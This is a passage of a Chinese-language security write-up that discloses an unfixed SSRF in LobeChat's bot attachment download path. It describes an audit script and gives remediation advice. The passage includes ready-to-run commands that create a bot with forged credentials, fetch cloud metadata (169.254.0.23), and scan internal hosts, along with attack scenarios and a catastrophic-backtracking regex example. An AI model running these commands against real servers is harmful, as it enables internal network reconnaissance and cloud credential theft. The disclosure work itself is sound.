官方按调用点打补丁，要判断"修没修完"，就得按全量调用点来查。我写了个工具 lobechat-audit.py，核心是 **入口-出口关联**：

1.  扫全仓库所有 fetch( 调用点，排除硬编码 URL 和已知第三方 API 域名
2.  扫 tRPC router 的输入 schema，收集所有 z.string().url() 字段名（用户可控 URL 的"入口"）
3.  交叉关联：只有"fetch 调用点的变量名出现在 router 输入字段里"的点，URL 才是真·用户可控

```plain
# 收集 router 输入 schema 里的 url 类字段
for m in re.finditer(r"(\w+)\s*:\s*z\.string\(\)\.url\(\)", text):
    fields.add(m.group(1).lower())

# fetch 调用点的变量名与之匹配 => 用户可控
if strong_match:
    var_name = strong_match.group(1).lower()
    linked = var_name in url_fields
    confidence = 0.9 if linked else 0.6
```

### 7.2 调优过程：从 167 处到 4 处

第一版太粗暴：把所有"变量名含 url 的 fetch"都报出来，结果 167 处，绝大多数是误报——webhookUrl、baseUrl、uploadUrl 这些虽然变量名带 url，但来源是服务端配置或平台回调，不是用户输入。

第二版加了两点：一是把 URL 变量名分成强信号（fetchUrl、imageUrl、externalUrl 这种几乎必然用户可控）和弱信号（裸 url、baseUrl）；二是做入口-出口关联，只有变量名真正出现在 router 输入 schema 里的才算高置信。

收敛后的结果：

```plain
[!] 高置信盲区: 裸 fetch + 变量名匹配 router 输入 + 无保护: 4 处
[!] ./apps/server/src/services/bot/platforms/discord/sendAttachments.ts:33
[!] ./apps/server/src/services/bot/platforms/wechat/sendAttachments.ts:61
[!] ./apps/server/src/services/bot/platforms/slack/sendAttachments.ts:20
[!] ./apps/server/src/services/bot/platforms/feishu/sendAttachments.ts:57
[+] 需人工复核 (变量名含 url 但未直接关联 router): 92 处
[+] 已受 ssrfSafeFetch 保护的调用点: 1 处
[+] ./packages/utils/src/imageToBase64.ts:104
结论: 4 处高置信盲区未纳入官方 SSRF 修复范围。
```

4 处高置信盲区全部指向 bot 附件下载，和手工逐行分析的结果一致。这个工具的价值在于：官方修完一轮之后跑一遍，就知道还有哪些口子没收——比人肉 grep 可靠，也不会漏。

### 7.3 工具的完整用法

除了 audit 子命令，lobechat-audit.py 还有三个实战子命令，对应文章第五部分的整个攻击链：

```plain
# 1) 创建 bot（伪造凭证）
python3 lobechat-audit.py bot \
  --url http://TARGET:3210 \
  --cookie 'better-auth.session_token=...' \
  --agent agt_14AmVANET91Q \
  --application-id 222333444555666777

# 2) 触发单次 SSRF
python3 lobechat-audit.py send \
  --url http://TARGET:3210 \
  --cookie 'better-auth.session_token=...' \
  --bot-id 77a0bac4-a395-4829-a16b-26c71f830583 \
  --fetch-url http://169.254.0.23/latest/meta-data/instance-id

# 3) 内网探测（盲打，需外部观测）
python3 lobechat-audit.py scan \
  --url http://TARGET:3210 \
  --cookie 'better-auth.session_token=...' \
  --bot-id 77a0bac4-a395-4829-a16b-26c71f830583 \
  --targets '172.25.0.1:9999,10.0.0.5:80'
```

audit 负责"找洞"，bot/send/scan 负责"验证洞"。这是这个工具和普通 PoC 脚本的区别：它把"修复完整性审计"（找同类问题）和"漏洞验证"（确认可打）放在一个工具里，整个流程可以自动化。

### 7.4 审计器在 loadPolicy 里看到的另一个候选点

跑审计器的时候，除了 4 处 SSRF 盲区，还注意到一个 ReDoS 相关的位置：packages/database/src/models/agentDocuments/policy/loadPolicy.ts。

```plain
case 'by-regexp': {
  if (!rules?.regexp || !context.currentUserMessage) return false;
  try {
    return new RegExp(rules.regexp, 'i').test(context.currentUserMessage);
  } catch {
    return false;
  }
}
```

rules.regexp 来自 agent 文档的 loadRules 配置，直接 new RegExp 后对用户消息做匹配。try/catch 只兜住了"正则不合法抛 SyntaxError"的情况，兜不住 **合法的灾难性回溯正则**——(a+)+$ 这种对超长输入照样能把事件循环卡死。

这个点我没验证完（loadRules 是否普通用户可写还需要查配置链），所以文章不展开当漏洞写。它倒是说明一个现象：同一次审计里，除了目标漏洞，往往还能看到同类的"半成品修复"或"未收口的防护"。找洞的收获不只是那一个洞，还有"这类问题还剩多少"的全局观。

### 7.5 局限性（诚实说）

-   只做静态关联：如果 URL 在函数间传了好几层、变量名改了，就关联不上，会漏报
-   只认 router 输入 schema：如果用户输入从工具链（Agent 工具调用）进来而不是 tRPC，同样漏报
-   有漏报就有误报：弱信号那 92 处还是得人工看

但作为审计的起点，它能把范围从全仓库收敛到几个点，效率提升是实打实的。

## 八、影响评估

-   攻击面：任意登录用户（server-database 模式 OSS 版）
-   利用条件：注册账号 + 创建 agent + 创建 bot（凭证可伪造，只需满足格式校验）
-   影响：内网端口扫描、访问云 metadata、探测内网服务
-   版本：v2.2.9 到 v2.2.14-canary.74（含 8 月 12 日最新版）全部受影响
-   平台面：Discord/Slack/微信/飞书四个 bot 平台全部受影响

### 8.1 攻击场景

拿这个 SSRF 能做什么，取决于部署环境：

**场景一：内网端口扫描。** 服务器在云上，内网一般有数据库、Redis、内部管理系统。用 sendMessage 的 fetchUrl 逐端口探测，配合 debug 日志的 files=1/0 就能画出内网拓扑。虽然盲打没有回显，但"哪个端口活着"这个信息本身就很有价值。

**场景二：打云 metadata。** 云服务器上的容器网络一般能直连 169.254.0.23（腾讯云）或 169.254.169.254（AWS/阿里云）的 metadata 服务。metadata 里有实例 ID、内网 IP、甚至临时 IAM 凭证（如果实例绑了角色）。我在腾讯云上验证了 instance-id 能被取回。

**场景三：打 Docker 网络。** LobeChat 跑在 docker 里，容器网络（172.x.0.0/16）里可能有同宿主机的其他容器——数据库、缓存、其他业务。SSRF 能横向打到这些容器。

**场景四：配合内网落点做有回显读取。** 盲打没有回显，但如果攻击者在目标内网有一台可控的 HTTP 服务（比如一个被忽略的测试机），SSRF 请求会带着路径信息打过去，攻击者能拿到"服务器请求了什么"的证据，也能借此确认内网拓扑。

### 8.2 什么部署不受影响

-   非 server-database 模式（数据在浏览器本地）没有多用户概念，攻击者无法注册独立账号触发——但这类部署通常是单用户自用，攻击面本身不存在
-   cloud 托管版（app.lobehub.com）用的是真实 RBAC 实现，权限不是空操作，能不能打到取决于 cloud 的权限模型（不在本文验证范围）

## 九、修复建议

1.  **botMessage 附件下载改用 ssrfSafeFetch**，四个平台统一改。参考官方修 skill 导入时的做法：

```plain
// 修复建议：discord/sendAttachments.ts
import { ssrfSafeFetch } from '@lobechat/ssrf-safe-fetch';

if (attachment.fetchUrl) {
  const response = await ssrfSafeFetch(attachment.fetchUrl, {
    signal: AbortSignal.timeout(15_000),
  });
  ...
}
```

slack/wechat/feishu 三个 sendAttachments.ts 同样处理。

1.  **凭证校验加"真实有效性检查"**。现在 botToken 只验三段式格式，不验证真伪。可以在创建 bot 时调一次平台 API（比如 Discord 的 /users/@me）确认 token 有效，无效就拒绝。这不影响 SSRF 本身，但把攻击门槛从"注册账号"抬高到"真的去注册一个 Discord 应用"。
2.  **SSRF 防护统一收口，并且让审计自动化**。长期看，应该把"项目里所有 fetch 用户 URL 的地方"收敛到一个统一的 fetch 封装，让防护成为默认行为而不是每个调用点手动套——可以做一个 lint 规则，禁止在服务端代码里直接调用全局 fetch 请求外部 URL，强制走 ssrfSafeFetch。另外，类似 lobechat-audit.py 的检查可以做成 CI 步骤：每次新增 fetch 调用点，自动检查是否套了防护、URL 是否来自用户输入。官方这次修了 6 处漏了 4 处同类型，根本原因就是修复没有自动化回归，这类检查做成 CI 比人肉记得住。

## 附录：关键文件位置

-   apps/server/src/routers/lambda/botMessage.ts（tRPC 入口，fetchUrl 输入）
-   apps/server/src/services/bot/platforms/discord/sendAttachments.ts（裸 fetch）
-   apps/server/src/services/bot/platforms/slack/sendAttachments.ts
-   apps/server/src/services/bot/platforms/wechat/sendAttachments.ts
-   apps/server/src/services/bot/platforms/feishu/sendAttachments.ts
-   packages/ssrf-safe-fetch/index.ts（官方防护实现）
-   packages/business-server/src/trpc-middlewares/rbacPermission.ts（OSS 权限空操作）
-   src/business/server/bot/featureAccess.ts（OSS bot 功能权限空操作）

配套工具 lobechat-audit.py 在文章同目录下，Python 3 标准库实现，四个子命令：audit（修复完整性审计）、bot（创建 bot）、send（触发 SSRF）、scan（内网探测）。无第三方依赖，可直接运行。

## 写在最后

回头看，这个洞的发现过程不复杂：官方修了四个洞，我把修复 diff 读了一遍，发现修 SSRF 只碰了两个端点，然后顺着"项目里还有哪些地方 fetch 用户 URL"一路找下去，bot 附件下载这条路径就浮出来了。

这个洞不复杂，就是官方修漏了。ssrfSafeFetch 封装得很用心，防了私网、防了重定向、防了 metadata，可它没被用在该用的地方。这篇写完，我最大的感受是：安全修复完之后，把同类调用点都过一遍，比只盯着审出来的那一个点更有效。
